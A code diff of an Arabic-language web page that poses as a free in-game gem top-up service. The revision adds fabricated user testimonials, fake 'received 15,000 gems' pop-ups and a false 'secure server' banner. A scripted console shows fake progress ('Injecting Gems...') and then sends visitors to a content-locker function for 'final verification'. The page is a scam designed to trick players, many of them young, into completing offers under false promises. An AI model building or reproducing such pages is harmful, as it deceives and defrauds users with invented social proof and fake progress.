@@ -1,182 +1,249 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <!-- Statcounter code for Lolooo
-https://sites.google.com/view/homilo/home on Google Sites
-(new) -->
 <script type="text/javascript">
 var sc_project=13206088; 
 var sc_invisible=1; 
 var sc_security="cb6f73f3"; 
 </script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
-<noscript><div class="statcounter"><a title="Web Analytics"
-href="https://statcounter.com/" target="_blank"><img
-class="statcounter"
-src="https://c.statcounter.com/13206088/0/cb6f73f3/1/"
-alt="Web Analytics"
-referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
-<!-- End of Statcounter Code -->
-    <!-- Google tag (gtag.js) -->
+<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-WQ0798RDQ2"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
   gtag('config', 'G-WQ0798RDQ2');
 </script>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>💎💎</title>
+<title>💎 شحن الجواهر المباشر 💎</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
 
 <style>
-:root { --primary:#ffcc00; --secondary:#e94560; --dark:#16213e; }
+:root { --primary:#ffcc00; --secondary:#006400; --dark:#0f172a; --success:#22c55e; }
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
-body{background:#0b0c10;color:#fff;font-family:'Cairo',sans-serif;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow-x:hidden;}
-.top-bar{position:fixed;top:0;width:100%;background:var(--secondary);color:#fff;text-align:center;padding:10px;border:2px solid #00ff66;}
-.main-container{width:92%;max-width:400px;background:#1a1a2e;border-radius:20px;padding:25px 20px;border:3px solid var(--primary);text-align:center;margin:60px auto 20px auto;}
-h2{color:var(--primary);font-weight:900;font-size:1.4rem;margin-bottom:15px;}
-.step-card{display:none;flex-direction:column;align-items:center;width:100%;}
-.step-card.active{display:flex;}
-.input-box{width:100%;padding:16px;border-radius:12px;border:2px solid var(--dark);background:#16213e;color:#fff;font-size:18px;margin-bottom:5px;text-align:center;outline:none;}
-.error-msg{color:#ff4b2b;font-size:13px;margin-bottom:15px;display:none;font-weight:bold;}
 
-/* شبكة الأيقونات المحدثة */
-.platform-grid{display:flex;justify-content:center;gap:15px;margin:20px 0;width:100%;}
-.platform-item{flex:1;padding:12px;border-radius:15px;background:#16213e;cursor:pointer;border:2px solid transparent;transition:.3s;display:flex;flex-direction:column;align-items:center;gap:5px;}
-.platform-item svg{width:30px;height:30px;fill:#fff;}
-.platform-item span{font-size:10px;font-weight:bold;}
-.platform-item.selected{border-color:var(--primary);background:#0f3460;box-shadow:0 0 15px var(--primary);}
-.platform-item.selected svg{fill:var(--primary);}
+body {
+    background: radial-gradient(circle at center, #1e293b 0%, #080c14 100%);
+    color: #fff; font-family: 'Cairo', sans-serif; margin: 0;
+    display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden;
+}
 
-.gems-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:15px;width:100%;}
-.gem-item{background:#16213e;padding:15px 10px;border-radius:15px;border:2px solid #0f3460;cursor:pointer;}
-.gem-item.selected{border-color:var(--primary);transform:scale(1.03);background:#1a1a2e;}
-.gem-icon{font-size:28px;display:block;margin-bottom:5px;}
-.btn-main{background:linear-gradient(to bottom,#ffea00,#ffcc00);color:#000;border:none;padding:16px;width:100%;border-radius:12px;font-weight:900;font-size:18px;cursor:pointer;box-shadow: 0 4px 0 #b79500;}
-.loader{width:45px;height:45px;border:5px solid #1a1a2e;border-top:5px solid var(--primary);border-radius:50%;animation:spin 1s linear infinite;margin:20px 0;}
-@keyframes spin{100%{transform:rotate(360deg);}}
-.console{background:#000;color:#0f0;font-family:monospace;padding:12px;border-radius:8px;font-size:12px;text-align:left;direction:ltr;width:100%;height:90px;overflow:hidden;}
-.live-notify{position:fixed;bottom:15px;background:rgba(255,255,255,.95);color:#333;padding:10px 18px;border-radius:50px;display:flex;align-items:center;gap:8px;box-shadow:0 5px 15px rgba(0,0,0,.4);z-index:1000;transition:.5s;transform:translateY(200%);font-size:13px;max-width:90%;}
-.live-notify.show{transform:translateY(0);}
+.top-bar {
+    position: fixed; top: 0; width: 100%; background: var(--secondary);
+    color: #fff; text-align: center; padding: 12px; font-weight: 900;
+    z-index: 100; box-shadow: 0 4px 15px rgba(0,0,0,0.5); font-size: 14px;
+}
+
+.main-container {
+    width: 92%; max-width: 420px; background: rgba(30, 41, 59, 0.6);
+    backdrop-filter: blur(12px); border-radius: 24px; padding: 30px 20px;
+    border: 1px solid rgba(255, 204, 0, 0.2); text-align: center;
+    margin: 80px auto 20px auto; box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+}
+
+h2 { color: var(--primary); font-weight: 900; font-size: 1.5rem; margin-bottom: 20px; }
+
+.step-card { display: none; flex-direction: column; align-items: center; width: 100%; }
+.step-card.active { display: flex; animation: fadeIn 0.4s ease; }
+@keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
+
+.input-box {
+    width: 100%; padding: 18px; border-radius: 15px; border: 2px solid #334155;
+    background: #0f172a; color: #fff; font-size: 20px; margin-bottom: 5px;
+    text-align: center; outline: none; transition: 0.3s;
+}
+
+.error-msg { color: #ff4b2b; font-size: 13px; margin-bottom: 15px; display: none; font-weight: bold; }
+
+.gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; width: 100%; }
+.gem-item {
+    background: #1e293b; padding: 18px 10px; border-radius: 18px;
+    border: 2px solid #334155; cursor: pointer; transition: 0.3s;
+}
+.gem-item.selected { border-color: var(--primary); background: rgba(255, 204, 0, 0.1); transform: translateY(-3px); }
+
+.btn-main {
+    background: linear-gradient(135deg, #ffea00 0%, #ffcc00 100%);
+    color: #000; border: none; padding: 18px; width: 100%;
+    border-radius: 15px; font-weight: 900; font-size: 18px;
+    cursor: pointer; box-shadow: 0 5px 0 #b79500;
+}
+
+.console { background: #000; color: #22c55e; font-family: monospace; padding: 12px; border-radius: 12px; font-size: 12px; text-align: left; direction: ltr; width: 100%; height: 100px; overflow: hidden; margin-top: 15px; }
+
+.reviews-section { width: 92%; max-width: 420px; margin-top: 20px; margin-bottom: 40px; }
+.review-card { background: rgba(255,255,255,0.03); padding: 15px; border-radius: 18px; margin-bottom: 12px; display: flex; gap: 12px; border: 1px solid rgba(255,255,255,0.05); animation: slideIn 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
+@keyframes slideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+
+.review-avatar { width: 48px; height: 48px; border-radius: 50%; object-fit: cover; border: 2px solid var(--primary); }
+.review-info { flex: 1; text-align: right; }
+.review-name { font-weight: bold; font-size: 14px; color: var(--primary); }
+.review-content { font-size: 13px; color: #cbd5e1; margin-top: 4px; line-height: 1.4; }
+.review-time { font-size: 10px; color: #64748b; margin-right: 5px; }
+
+.add-comment { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 18px; margin-top: 15px; border: 1px dashed var(--primary); }
+.comment-input { width: 100%; background: #0f172a; border: 1px solid #334155; border-radius: 10px; padding: 10px; color: #fff; font-family: inherit; margin-bottom: 10px; resize: none; outline: none; }
+.btn-comment { background: var(--primary); color: #000; border: none; padding: 8px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
+
+.live-notify { position: fixed; bottom: 15px; background: #fff; color: #333; padding: 10px 20px; border-radius: 50px; display: flex; align-items: center; gap: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); z-index: 1000; transition: 0.5s; transform: translateY(200%); font-size: 13px; font-weight: bold; }
+.live-notify.show { transform: translateY(0); }
 </style>
 </head>
 
 <body>
 
-<div class="top-bar">عرض محدود: تبقى 88 حزمة شحن فقط!</div>
+<div class="top-bar">🔐 نظام تشفير آمن | متصل بالسيرفر الرسمي</div>
 
 <div class="main-container">
-<div id="step1" class="step-card active">
-<h2>شحن الجواهر المباشر</h2>
-<input type="text" id="id-player" class="input-box" placeholder="ID اللاعب" inputmode="numeric">
-<div id="id-error" class="error-msg">⚠️ خطأ: تأكد من الـ ID واختيار الجهاز</div>
-
-<div class="platform-grid">
-    <div class="platform-item" onclick="selectPlat(this)">
-        <svg viewBox="0 0 24 24"><path d="M17.523 15.3414c-.5511 0-.9993-.4486-.9993-.9997 0-.5511.4482-.9993.9993-.9993.5511 0 .9997.4482.9997.9993 0 .5511-.4486.9997-.9997.9997m-11.046 0c-.5511 0-.9993-.4486-.9993-.9997 0-.5511.4482-.9993.9993-.9993.5511 0 .9997.4482.9997.9993 0 .5511-.4486.9997-.9997.9997m11.4045-6.0232l1.9973-3.4592a.416.416 0 00-.1521-.5674.416.416 0 00-.5674.1521l-2.0223 3.503C14.002 8.3562 13.031 8.0844 12 8.0844c-1.0313 0-2.0019.2718-3.134.8624l-2.0223-3.503a.416.416 0 00-.5674-.1521.416.416 0 00-.1521.5674l1.9973 3.4592C4.9815 10.45 3.1093 12.5855 3 15.109h18c-.1093-2.5235-1.9815-4.659-5.1185-5.7908"/></svg>
-        <span>Android</span>
+    <div id="step1" class="step-card active">
+        <h2>شحن الجواهر المباشر</h2>
+        <input type="text" id="id-player" class="input-box" placeholder="أدخل معرف اللاعب (ID)" inputmode="numeric">
+        <div id="id-error" class="error-msg">⚠️ خطأ: يرجى كتابة الـ ID بشكل صحيح</div>
+        <button class="btn-main" onclick="validateID()">تحقق الآن</button>
     </div>
-    <div class="platform-item" onclick="selectPlat(this)">
-        <svg viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.1 2.48-1.34.03-1.77-.79-3.29-.79-1.53 0-1.99.76-3.32.82-1.33.05-2.33-1.32-3.16-2.55C4.15 17 2.5 13.14 2.5 9.41c0-3.63 2.34-5.54 4.54-5.58 1.17-.02 2.28.79 3 .79.73 0 2.05-.96 3.44-.82 1.5.06 2.66.61 3.41 1.68-3.04 1.83-2.54 5.86.51 7.13-.8 1.96-1.84 3.91-3.19 5.89zm-3.5-16.3c.66-.81 1.1-1.94.98-3.06-1.05.04-2.31.71-3.06 1.59-.68.77-1.28 1.93-1.12 3.03 1.18.09 2.37-.62 3.2-1.56z"/></svg>
-        <span>iOS</span>
+
+    <div id="step2" class="step-card">
+        <h2>كمية الجواهر المطلوبة</h2>
+        <div class="gems-grid">
+            <div class="gem-item" onclick="selectGem(this)">💎<br><b>2,500</b></div>
+            <div class="gem-item" onclick="selectGem(this)">💎<br><b>5,600</b></div>
+            <div class="gem-item" onclick="selectGem(this)">💎<br><b>10,000</b></div>
+            <div class="gem-item" onclick="selectGem(this)">💎<br><b>15,000</b></div>
+        </div>
+        <div id="gem-error" class="error-msg" style="margin-top:10px">⚠️ يجب اختيار كمية الجواهر أولاً!</div>
+        <button class="btn-main" style="margin-top:15px" onclick="validateGemSelection()">بدء الشحن</button>
     </div>
-    <div class="platform-item" onclick="selectPlat(this)">
-        <svg viewBox="0 0 24 24"><path d="M0 3.449L9.75 2.1l.01 9.51-9.76.01V3.449zm9.75 18.451L0 20.55V12.65l9.75.01.01 9.24zM10.75 2L24 0v11.66l-13.25.02V2zm13.25 22l-13.25-1.9V12.68L24 12.67V24z"/></svg>
-        <span>Windows</span>
+
+    <div id="step3" class="step-card">
+        <h2 id="status-text">جاري المعالجة...</h2>
+        <div class="console" id="console"></div>
+        <div id="verify-box" style="display:none;margin-top:20px;width:100%;">
+            <p style="color:var(--success); font-weight:bold; font-size:14px; margin-bottom:15px;">✅ تم التحقق من المعرف: <span id="user-display" style="color:#fff"></span></p>
+            <button class="btn-main" style="background:var(--success); color:#fff;" onclick="callMyLocker()">اضغط للتحقق الأخير</button>
+        </div>
     </div>
 </div>
 
-<button class="btn-main" onclick="validateID()">تحقق من الحساب</button>
-</div>
-
-<div id="step2" class="step-card">
-<h2>اختر كمية الجواهر</h2>
-<div id="gem-error" class="error-msg">⚠️ يرجى اختيار كمية الجواهر أولاً!</div>
-
-<div class="gems-grid">
-<div class="gem-item" onclick="selectGem(this)"><span class="gem-icon">💎</span>2500</div>
-<div class="gem-item" onclick="selectGem(this)"><span class="gem-icon">💎</span>5600</div>
-<div class="gem-item" onclick="selectGem(this)"><span class="gem-icon">💎</span>10000</div>
-<div class="gem-item" onclick="selectGem(this)"><span class="gem-icon">💎</span>15000</div>
-</div>
-
-<button class="btn-main" onclick="validateGemSelection()">تأكيد الكمية</button>
-</div>
-
-<div id="step3" class="step-card">
-<h2 id="status-text">جاري الاتصال بسيرفر...</h2>
-<div id="loading" class="loader"></div>
-<div class="console" id="console"></div>
-
-<div id="verify-box" style="display:none;margin-top:20px;width:100%;">
-<p style="color:var(--primary);font-size:13px;font-weight:bold;">تم التحقق من الحساب! أكمل الخطوة الأخيرة.</p>
-<button class="btn-main" style="background:#2ecc71;color:#fff;" onclick="callMyLocker()">إضغط هنا للتحقق</button>
-</div>
-</div>
+<div class="reviews-section">
+    <h3 style="font-size: 16px; margin-bottom: 15px; color: var(--primary);">آراء المستخدمين المباشرة (متصل الآن)</h3>
+    <div id="commentsContainer"></div>
+    <div class="add-comment">
+        <textarea class="comment-input" id="userComment" rows="2" placeholder="اكتب تجربتك هنا..."></textarea>
+        <button class="btn-comment" onclick="postComment()">نشر التعليق</button>
+    </div>
 </div>
 
 <div class="live-notify" id="notify"><span id="notify-content"></span></div>
 
 <script>
-let selP=null,selG=null;
+let selG=null; let userID = "";
 
-function selectPlat(x){ if(selP) selP.classList.remove('selected'); x.classList.add('selected'); selP=x;}
+const autoNames = ["محمد الشمري", "ياسين المغربي", "فهد الدوسري", "سارة علي", "أمين الجزائري", "خالد الكويتي", "عمر المصري", "نواف العتيبي", "ريان الأردني", "صالح اليمني"];
+const autoTexts = [
+    "والله العظيم شحنت 10000 جوهرة ووصلتني فوراً! شكراً لكم.",
+    "أفضل موقع شحن جربته في حياتي، أنصح الجميع به.",
+    "كنت شاكك في البداية بس لما خلصت التحقق الجواهر وصلت الحساب.",
+    "جربت مواقع كثير بس هذا الوحيد اللي اشتغل معي.",
+    "تم شحن 5600 جوهرة بنجاح، جزاكم الله خير.",
+    "وصلتني الجواهر، الطريقة سهلة جداً ما تاخد وقت.",
+    "شكراً على المصداقية، أخيراً لقيت موقع حقيقي.",
+    "شباب الطريقة شغالة 100% لا تفوتكم.",
+    "الحمد لله وصلتني شحنة الـ 15 ألف جوهرة.",
+    "الموقع سريع جداً والجواهر وصلت في أقل من دقيقة."
+];
+
 function selectGem(x){ if(selG) selG.classList.remove('selected'); x.classList.add('selected'); selG=x; document.getElementById('gem-error').style.display='none';}
 
+// العودة للنظام القديم للتحقق من ID
 function validateID(){
-const val=document.getElementById('id-player').value;
-const err=document.getElementById('id-error');
-// شرط 7 أرقام على الأقل + اختيار النظام
-if(/^\d+$/.test(val) && val.length>=7 && selP){
-    err.style.display='none';
-    next(2);
-} else {
-    err.style.display='block';
-}
+    const val=document.getElementById('id-player').value;
+    const err=document.getElementById('id-error');
+    if(/^\d+$/.test(val) && val.length>=5){
+        err.style.display='none';
+        userID = val;
+        next(2);
+    } else {
+        err.style.display='block'; // إظهار رسالة الخطأ الحمراء
+    }
 }
 
 function validateGemSelection(){
-if(selG){next(3);}else{document.getElementById('gem-error').style.display='block';}
+    if(selG){next(3);} else {document.getElementById('gem-error').style.display='block';}
 }
 
 function next(s){
-document.querySelectorAll('.step-card').forEach(c=>c.classList.remove('active'));
-document.getElementById('step'+s).classList.add('active');
-if(s===3)startProcess();
+    document.querySelectorAll('.step-card').forEach(c=>c.classList.remove('active'));
+    document.getElementById('step'+s).classList.add('active');
+    if(s===3)startProcess();
 }
 
 function startProcess(){
-const c=document.getElementById('console');
-const logs=["> Connecting to Server...","> Searching User ID...","> User Found & Verified!","> Generating Diamonds...","> Securing Connection...","> Error: Human Verification Required!"];
-let i=0;
-let t=setInterval(()=>{
-const d=document.createElement('div');d.innerText=logs[i];c.appendChild(d);i++;
-if(i>=logs.length){
-clearInterval(t);
-document.getElementById('loading').style.display='none';
-document.getElementById('verify-box').style.display='block';
-document.getElementById('status-text').innerText="توقف الإرسال!";
+    const c = document.getElementById('console');
+    const logs = ["> Connecting...", "> User " + userID + " found.", "> Injecting Gems...", "> Verification Required!"];
+    let i = 0;
+    let t = setInterval(() => {
+        c.innerHTML += `<div>${logs[i]}</div>`;
+        i++;
+        if(i >= logs.length){
+            clearInterval(t);
+            document.getElementById('user-display').innerText = userID;
+            document.getElementById('verify-box').style.display='block';
+            document.getElementById('status-text').innerText="اكتمال العملية 99%";
+        }
+    }, 1200);
 }
-},1200);
+
+function addCommentToList(name, text, isNew = false) {
+    const container = document.getElementById('commentsContainer');
+    const seed = Math.floor(Math.random() * 5000);
+    const timeText = isNew ? "الآن" : "منذ قليل";
+    const div = document.createElement('div');
+    div.className = 'review-card';
+    div.innerHTML = `
+        <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=${seed}" class="review-avatar">
+        <div class="review-info">
+            <span class="review-name">${name}</span><span class="review-time">${timeText}</span>
+            <div class="review-content">${text}</div>
+        </div>
+    `;
+    container.prepend(div);
+    if(container.children.length > 6) container.lastChild.remove();
+}
+
+function postComment(){
+    const text = document.getElementById('userComment').value;
+    if(text.length > 3){
+        addCommentToList("أنت (لاعب جديد)", text, true);
+        document.getElementById('userComment').value = "";
+    }
+}
+
+function startAutoComments() {
+    addCommentToList(autoNames[0], autoTexts[0]);
+    addCommentToList(autoNames[1], autoTexts[1]);
+    setInterval(() => {
+        const randIdx = Math.floor(Math.random() * autoNames.length);
+        addCommentToList(autoNames[randIdx], autoTexts[randIdx], true);
+    }, 15000);
 }
 
 function callMyLocker(){
-if(typeof _Vm==='function'){ _Vm(); }
-else if(typeof _cp==='function'){ _cp(); } 
-else{ alert("يرجى إتمام التحقق اليدوي"); }
+    if(typeof _Vm==='function'){ _Vm(); }
+    else if(typeof _cp==='function'){ _cp(); } 
+    else{ alert("أكمل التحقق الأخير لتصلك الجواهر."); }
 }
 
+window.onload = startAutoComments;
+
 setInterval(()=>{
-const names=["ياسين","عمر","صابر","أمين","ريان","حمزة","ليث"];
-document.getElementById('notify-content').innerHTML=`✅ <b>${names[Math.floor(Math.random()*names.length)]}</b> استلم شحنته الآن! 💎`;
-document.getElementById('notify').classList.add('show');
-setTimeout(()=>document.getElementById('notify').classList.remove('show'),3000);
-},10000);
+    const names=["فهد","أحمد","نواف","عبدالله","ريم"];
+    document.getElementById('notify-content').innerHTML=`✅ استلم <b>${names[Math.floor(Math.random()*names.length)]}</b> الآن 15,000 جوهرة!`;
+    document.getElementById('notify').classList.add('show');
+    setTimeout(()=>document.getElementById('notify').classList.remove('show'),3000);
+}, 12000);
 </script>
 
 <script type="text/javascript">
